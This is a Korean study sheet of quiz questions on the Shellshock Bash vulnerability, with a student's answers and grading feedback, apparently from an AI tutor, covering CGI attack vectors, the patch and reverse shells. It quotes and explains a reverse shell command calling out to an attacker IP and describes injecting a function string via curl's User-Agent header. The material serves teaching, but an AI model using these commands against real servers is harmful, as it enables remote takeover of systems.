
1. **셸 함수(Shell Function)**를 자식 프로세스에 전달하는 과정에서, 취약한 구버전 Bash와 현재 패치된 Bash는 어떤 근본적인 차이점이 있나요? 특히, 함수 정의를 **환경 변수**에 저장하는 방식의 차이점을 설명하세요.
	과거에는 () {로 시작하면 함수로 인식했지만, 현재는 함수의 정의가 완벽히 되어있어야 함수로 인식한다. 그래서 취약 버전에서 () {로 시작만 하는 문자열을 자식 프로세스로 넘기면 함수가 되었지만 현재 버전에서는 자식 프로세스에 넘기더라도 문자열로 인식한다.❌
	
2. **Shellshock 취약점**의 핵심 원리는 무엇인가요? 공격자가 `foo='() { ... }; <command>'` 와 같은 형식의 환경 변수를 만들었을 때, 취약한 Bash 셸이 이 변수를 어떻게 처리하기에 의도치 않은 `<command>`가 실행되는지 설명하세요.
   () {로 시작했기 때문에 () {....}를 함수로 인식하고;로 마무리한다. 그 뒤에 커맨드를 실행한다.
    
3. Shellshock은 **"데이터가 코드로 해석되어서는 안 된다"**는 중요한 보안 원칙을 위반한 사례입니다. 이 취약점에서 '데이터'에 해당하는 부분과, 그것이 어떻게 '코드'로 실행되었는지 구체적으로 설명하세요.
    데이터는 함수이고 코드는 함수 뒤에 명령어다. ❌
4. 수많은 서비스 중 **CGI(Common Gateway Interface) 스크립트**가 Shellshock의 주요 공격 통로(vector)가 된 이유는 무엇인가요? 웹 서버가 외부로부터 받은 HTTP 요청을 CGI 스크립트에 전달하는 과정을 **환경 변수**와 연관 지어 설명하세요.
	패치 이전 쉘에서 () {로 시작하면 함수로 인식하고, 함수 뒤에 부분은 명령어로 인식한다는 것을 악용해서 클라이언트에서 서버의 정보를 알아낼수 있는 취약한 문자열을 환경변수로 심어두고 자식 프로세스를 실행하면 환경변수로 취약한 문자열의 명령을 자동으로 실행하게 하여 공격한다.
5. 공격 시연에서 `curl -A "..." http://...` 와 같은 명령어를 사용했습니다. 여기서 `-A` 옵션은 어떤 HTTP 헤더를 의미하며, 이 헤더의 내용이 어떻게 서버에서 실행되는 CGI 스크립트의 환경 변수가 되는지 설명하세요.❌
    
6. **리버스 셸(Reverse Shell)**이란 무엇이며, 공격자가 방화벽이 있는 서버를 공격할 때 일반적인 원격 셸(Remote Shell) 대신 리버스 셸을 선호하는 이유는 무엇인가요?
    리버스 셸은 공격측에서 입력과 출력을 모두 할 수 있기때문에 ❌
7. 리버스 셸을 생성하기 위해 사용된 다음 명령어의 각 부분이 어떤 의미를 갖는지 설명하세요: `/bin/bash -i > /dev/tcp/10.0.2.6/9090 0<&1 2>&1`
    bash셸을 인터렉티브 모드로 9090포트에서 실행한다. 조건은 stdin은 stdout을 참조해야 하고 stderr는 stdin을 참조해야 한다. ❌
8. 웹 서버를 통해 원격으로 Shellshock 공격을 성공시키기 위해 반드시 충족되어야 할 **두 가지 핵심 조건**은 무엇인지 설명하세요.
    shellshock보안이 없는 셸,❌
9. 강의 자료 7페이지의 소스 코드에 따르면, Bash가 환경 변수를 초기화할 때 `parse_and_execute` 함수를 호출한 것이 근본적인 실수였습니다. 함수 정의를 처리하는 과정에서 이 함수를 호출한 것이 왜 위험한지 설명하세요.❌
    자식 프로세스를 초기에 실행할 때 아무 명령을 하지 않아도 기본적으로 execute함수가 실행되기 때문이다.
10. 패치된 Bash는 Shellshock 문제를 어떻게 해결했나요? 이제 Bash는 일반 환경 변수와 부모로부터 물려받은 **셸 함수**를 어떻게 구분하여 안전하게 처리하는지 설명하세요.
    `%%`구분자를 추가하여 문자열과 함수를 구분하였다
    
    
    네, 작성하신 답변을 채점했습니다. Shellshock의 기본 원리에 대해 잘 이해하고 계시네요. 오답으로 처리되었거나 보충 설명이 필요한 5, 6, 7, 8, 9번 문항과, 약간의 오해가 있는 1, 3번 문항에 대해 자세히 설명해 드릴게요.

---

### ## 1번: 셸 함수 전달 방식의 차이점

> **작성하신 답변:** 과거에는 () {로 시작하면 함수로 인식했지만, 현재는 함수의 정의가 완벽히 되어있어야 함수로 인식한다. (...)

**피드백:** 설명 방향은 맞지만, 핵심적인 기술 차이가 빠져 있습니다. 패치된 Bash는 단순히 "완벽한 정의"를 확인하는 것이 아니라, 함수를 담는 환경 변수에 **특별한 이름 규칙**을 적용합니다.

**보충 설명:**

- **취약한 Bash (과거):** 환경 변수의 **값**이 `() {`로 시작하면 그 변수를 무조건 함수 정의로 해석했습니다.
    
- **패치된 Bash (현재):** `export -f foo` 명령어로 함수를 전달하면, `foo`라는 이름의 변수가 아닌 `BASH_FUNC_foo%%`라는 **특별한 접두사(`BASH_FUNC_`)와 접미사(`%%`)가 붙은 이름의 환경 변수**를 생성합니다. 2패치된 Bash는 오직 이 특별한 이름 규칙을 가진 변수만 함수로 인식하고, `foo='() {...}'`와 같은 변수는 단순한 문자열 데이터로 취급합니다. 3333
    

---

### ## 3번: 데이터와 코드의 구분 위반

> **작성하신 답변:** 데이터는 함수이고 코드는 함수 뒤에 명령어다.

**피드백:** 이 답변은 약간의 오해가 있습니다. 환경 변수에 담긴 **문자열 전체가 '데이터'**입니다. 이 데이터의 일부가 '코드'로 잘못 실행되는 것이 문제입니다.

**보충 설명:**

- **데이터:** 공격자가 환경 변수에 저장한 `() { ... }; echo extra` 라는 **문자열 전체**가 데이터입니다. 4
    
- **코드로 실행된 부분:** 취약한 Bash가 이 데이터를 처리(parsing)할 때, 함수 정의 부분 `() { ... }`을 처리한 후에도 파싱을 멈추지 않고, 그 뒤에 따라오는 `echo extra` 부분까지 **명령어(코드)로 인식하여 실행**해 버립니다. 5 즉, **데이터의 일부가 코드로 둔갑**한 것입니다.
    

---

### ## 5번: `curl -A` 옵션의 의미와 CGI 환경 변수

> **작성하신 답변:** (공란)

**보충 설명:**

- **`-A` 옵션의 의미:** `curl` 명령어의 `-A` 옵션은 HTTP 요청 헤더의 **User-Agent** 필드 값을 지정하는 역할을 합니다. 6666 User-Agent는 보통 웹 브라우저의 종류와 버전 정보(예: 'Mozilla/5.0 ...')를 담는 곳입니다.
    
- **CGI와 환경 변수:** 아파치(Apache)와 같은 웹 서버는 CGI 스크립트를 실행할 때, 클라이언트가 보낸 HTTP 요청 헤더의 내용들을 **환경 변수**로 만들어 CGI 프로세스에 전달합니다. 7777예를 들어, `User-Agent` 헤더는 `HTTP_USER_AGENT`라는 이름의 환경 변수가 됩니다. 8
    

결과적으로 공격자는 `-A` 옵션을 통해 악의적인 함수 정의 문자열을 User-Agent 값으로 보내고, 웹 서버는 이 값을 그대로 `HTTP_USER_AGENT` 환경 변수에 담아 취약한 Bash CGI 스크립트를 실행시켜 공격을 성공시킵니다.

---

### ## 6번: 리버스 셸(Reverse Shell)의 장점

> **작성하신 답변:** 리버스 셸은 공격측에서 입력과 출력을 모두 할 수 있기 때문에

**피드백:** 일반 원격 셸(Remote Shell)도 공격자가 입출력을 모두 할 수 있습니다. 리버스 셸의 진짜 장점은 **방화벽을 우회**하는 데 있습니다.

**보충 설명:**

- **원격 셸 (예: ssh):** **공격자**가 **서버(희생자)** 쪽으로 접속을 시도합니다. 9 하지만 대부분의 서버는 방화벽을 통해 외부에서 들어오는(inbound) 알 수 없는 연결을 차단하므로, 이 방식은 막힐 가능성이 높습니다.
    
- **리버스 셸:** 반대로, 서버(희생자)에서 실행된 악성 코드가 **공격자**의 PC로 접속을 시도합니다. 10 대부분의 방화벽은 내부에서 외부로 나가는(outbound) 연결은 허용하는 경우가 많기 때문에, 이 연결은 성공할 확률이 높습니다. 즉, 셸의 제어권을 "거꾸로(reverse)" 연결하여 방화벽을 우회하는 것입니다.
    

---

### ## 7번: 리버스 셸 명령어 분석

> **작성하신 답변:** bash셸을 인터렉티브 모드로 9090포트에서 실행한다. 조건은 stdin은 stdout을 참조해야 하고 stderr는 stdin을 참조해야 한다.

**피드백:** I/O 리다이렉션(redirection) 설명이 약간 부정확합니다. `stderr`는 `stdin`이 아닌 `stdout`을 참조합니다.

**보충 설명:**

- `/bin/bash -i`: **대화형(interactive)** 셸을 실행합니다. 11
    
- `> /dev/tcp/10.0.2.6/9090`: 셸의 **표준 출력(stdout, 파일 디스크립터 1번)**을 공격자 IP(10.0.2.6)의 9090번 포트로 연결된 네트워크 소켓으로 보냅니다. 12
    
- `0<&1`: **표준 입력(stdin, 0번)**이 **표준 출력(1번)**이 가리키는 곳(네트워크 소켓)으로부터 입력을 받도록 합니다. 즉, 공격자가 보내는 명령을 받습니다. 13
    
- `2>&1`: **표준 에러(stderr, 2번)** 역시 **표준 출력(1번)**이 가리키는 곳(네트워크 소켓)으로 보내도록 합니다. 즉, 에러 메시지도 공격자에게 전송됩니다. 14
    

---

### ## 8번: Shellshock 공격 성공 조건

> **작성하신 답변:** shellshock보안이 없는 셸

**피드백:** 한 가지 조건만 답변하셨습니다. 나머지 중요한 조건이 하나 더 있습니다.

**보충 설명:**

Shellshock 공격이 성공하려면 다음 두 가지 조건이 모두 충족되어야 합니다. 15

1. **취약한 버전의 Bash 셸**이 실행되어야 합니다.
    
2. 공격자가 **입력한 데이터가 Bash 셸의 환경 변수로 전달**될 수 있는 경로가 있어야 합니다. (CGI가 대표적인 예입니다.)
    

---

### ## 9번: `parse_and_execute` 함수의 위험성

> **작성하신 답변:** 자식 프로세스를 초기에 실행할 때 아무 명령을 하지 않아도 기본적으로 execute함수가 실행되기 때문이다.

**피드백:** 조금 더 구체적인 설명이 필요합니다. 위험한 이유는 함수 이름 그대로 **"파싱(parsing)"과 "실행(execute)"을 한 번에 처리**했기 때문입니다.

**보충 설명:**

`parse_and_execute` 함수는 환경 변수로부터 함수 정의를 읽어들인 후, 함수 정의가 끝나는 `}` 문자 뒤에 추가적인 문자열이 남아있으면 그것까지 **계속해서 명령어로 해석하고 실행**해버리는 로직을 가지고 있었습니다. 16161616 안전한 설계였다면, 함수 정의를 파싱하는 기능과 명령어를 실행하는 기능은 분리되어야 하며, 함수 정의 파서는 `}` 문자를 만나면 즉시 작업을 중단했어야 합니다. 이 함수 하나에 두 가지 기능이 섞여 있었던 것이 취약점의 근본 원인입니다.